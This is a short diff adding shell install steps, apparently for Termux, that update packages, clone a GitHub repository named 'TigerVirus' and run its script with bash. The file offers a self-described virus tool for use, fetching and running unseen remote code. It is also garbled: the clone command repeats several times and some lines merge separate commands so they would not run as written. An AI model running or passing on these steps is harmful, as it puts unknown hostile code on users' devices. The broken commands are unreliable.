@@ -1,0 +1,13 @@
+apt update
+apt upgrade -y 
+pkg install git -y
+git clone https://github.com/Devil-Tigers/TigerVirus.git
+bash TigerVirus.sh
+cd TigerVirus git clone https://github.com/Devil-Tigers/TigerVirus.git
+pkg install git -y bash TigerVirus.sh
+
+git clone https://github.com/Devil-Tigers/TigerVirus.git
+pkg install git -y bash TigerVirus.sh
+
+git clone https://github.com/Devil-Tigers/TigerVirus.git
+
